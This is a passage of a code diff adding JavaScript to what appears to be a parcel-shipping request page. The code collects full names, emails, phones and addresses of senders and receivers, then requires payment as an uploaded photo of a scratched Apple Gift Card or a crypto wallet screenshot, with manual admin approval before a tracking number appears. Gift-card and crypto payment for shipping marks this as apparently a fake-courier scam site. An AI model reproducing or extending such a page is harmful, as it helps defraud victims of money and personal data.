+        var r = Math.min(max / w, max / h);
+        w = Math.round(w * r);
+        h = Math.round(h * r);
+      }
+      try {
+        var c = document.createElement('canvas');
+        c.width = w;
+        c.height = h;
+        c.getContext('2d').drawImage(img, 0, 0, w, h);
+        cb(c.toDataURL('image/jpeg', 0.7));
+      } catch (e) {
+        cb(ev.target.result);
+      }
+    };
+    img.onerror = function() { cb(ev.target.result); };
+    img.src = ev.target.result;
+  };
+  reader.onerror = function() { cb(null); };
+  reader.readAsDataURL(file);
+}
+
+function showStatusBlock(which) {
+  ['statusPending', 'statusApproved', 'statusRejected'].forEach(function(id) {
+    document.getElementById(id).style.display = (id === which) ? 'block' : 'none';
+  });
+}
+
+function stopWatching() {
+  clearInterval(statusTimer);
+  statusTimer = null;
+  watchedRequestId = null;
+}
+
+async function checkRequestStatus(manual) {
+  if (!watchedRequestId || !supabaseClient) return;
+  var note = document.getElementById('statusNote');
+  try {
+    var res = await supabaseClient
+      .from('shipment_requests')
+      .select('*')
+      .eq('request_id', watchedRequestId)
+      .maybeSingle();
+    var r = res.data;
+    if (res.error) {
+      console.error(res.error);
+      if (manual && note) note.textContent = 'Could not check status. Try again.';
+      return;
+    }
+    if (!r) {
+      if (manual && note) note.textContent = 'We could not find this request.';
+      return;
+    }
+    if (r.status === 'approved') {
+      document.getElementById('finalTracking').textContent = r.tracking_number || '';
+      document.getElementById('trackNowBtn').onclick = function() {
+        location.href = 'track.html?tn=' + encodeURIComponent(r.tracking_number || '');
+      };
+      showStatusBlock('statusApproved');
+      stopWatching();
+    } else if (r.status === 'rejected') {
+      document.getElementById('rejectedIdText').textContent = r.request_id;
+      showStatusBlock('statusRejected');
+      stopWatching();
+    } else {
+      showStatusBlock('statusPending');
+      if (manual && note) note.textContent = 'Still waiting for approval (checked ' + new Date().toLocaleTimeString() + ').';
+    }
+  } catch (err) {
+    console.error(err);
+    if (manual && note) note.textContent = 'Network error while checking status.';
+  }
+}
+
+function startWatching(requestId) {
+  stopWatching();
+  watchedRequestId = requestId;
+  lastRequestId = requestId;
+  document.getElementById('statusNote').textContent = 'This page updates by itself once the admin reviews your payment.';
+  showStatusBlock('statusPending');
+  statusTimer = setInterval(function() { checkRequestStatus(false); }, 4000);
+}
+
+function goToStatusPage() {
+  var id = lastRequestId || document.getElementById('requestIdText').textContent;
+  if (!id) return;
+  location.href = 'track.html?tn=' + encodeURIComponent(id);
+}
+
+function retryAfterRejection() {
+  stopWatching();
+  var btn = document.getElementById('confirmBtn');
+  btn.disabled = false;
+  btn.textContent = 'Submit payment for approval';
+  goToStep(4);
+}
+
+function submitShipment() {
+  var paymentType = document.querySelector('input[name="payment"]:checked');
+  if (!paymentType) {
+    alert('Please select a payment method');
+    return;
+  }
+  paymentType = paymentType.value;
+
+  if (paymentType === 'gift' && !document.getElementById('giftImage').files[0]) {
+    alert('Please upload the scratched Apple Gift Card photo');
+    return;
+  }
+  if (paymentType === 'wallet' && !document.getElementById('walletImage').files[0]) {
+    alert('Please upload the payment screenshot');
+    return;
+  }
+  if (paymentType === 'chat') {
+    alert('Please continue on WhatsApp, or choose Apple Gift Card / Crypto Wallet to upload your proof.');
+    return;
+  }
+  if (!supabaseClient) {
+    alert('Connection error. Refresh the page and try again.');
+    return;
+  }
+
+  var originCity = document.getElementById('shipperCity').value.trim();
+  var destCity = document.getElementById('receiverCity').value.trim();
+  var requestId = generateRequestId();
+  var confirmBtn = document.getElementById('confirmBtn');
+  var originalLabel = confirmBtn.textContent;
+
+  function resetButton() {
+    confirmBtn.disabled = false;
+    confirmBtn.textContent = originalLabel;
+  }
+
+  function finish(proofData) {
+    var row = {
+      request_id: requestId,
+      status: 'pending_approval',
+      payment_method: paymentType,
+      payment_proof: proofData || null,
+      origin: originCity,
+      destination: destCity,
+      shipper: {
+        name: document.getElementById('shipperName').value,
+        email: document.getElementById('shipperEmail').value,
+        phone: document.getElementById('shipperCode').value + ' ' + document.getElementById('shipperPhone').value,
+        country: document.getElementById('shipperCountry').value,
+        city: originCity,
+        street: document.getElementById('shipperStreet').value,
+        building: document.getElementById('shipperBuilding').value,
+        landmark: document.getElementById('shipperLandmark').value
+      },
+      receiver: {
+        name: document.getElementById('receiverName').value,
+        email: document.getElementById('receiverEmail').value,
+        phone: document.getElementById('receiverCode').value + ' ' + document.getElementById('receiverPhone').value,
+        country: document.getElementById('receiverCountry').value,
+        city: destCity,
+        street: document.getElementById('receiverStreet').value,
+        building: document.getElementById('receiverBuilding').value,
+        landmark: document.getElementById('receiverLandmark').value
+      },
+      package: {
+        type: document.getElementById('shipType').value,
+        description: document.getElementById('shipDesc').value,
+        pieces: document.getElementById('shipPieces').value,
+        weight: document.getElementById('shipWeight').value,
+        length: document.getElementById('shipLength').value,
+        width: document.getElementById('shipWidth').value,
+        height: document.getElementById('shipHeight').value,
+        service: document.getElementById('serviceType').value
+      }
+    };
+
+    supabaseClient.from('shipment_requests').insert([row]).then(function(res) {
+      resetButton();
+      if (res.error) {
+        console.error(res.error);
+        alert('Could not save your request. Please try again.\n' + (res.error.message || ''));
+        return;
+      }
+      document.getElementById('requestIdText').textContent = requestId;
+      startWatching(requestId);
+      goToStep('success');
+    }).catch(function(err) {
+      resetButton();
+      console.error(err);
+      alert('Network error. Please try again.');
+    });
+  }
+
+  var fileInput = paymentType === 'gift'
+    ? document.getElementById('giftImage')
+    : document.getElementById('walletImage');
+  confirmBtn.disabled = true;
+  confirmBtn.textContent = 'Uploading…';
+  compressImage(fileInput.files[0], function(dataUrl) {
+    if (!dataUrl) {
+      resetButton();
+      alert('Could not read the image. Please try another photo.');
+      return;
+    }
+    finish(dataUrl);
+  });
+}
+
+  </script>
+</body>
+</html>
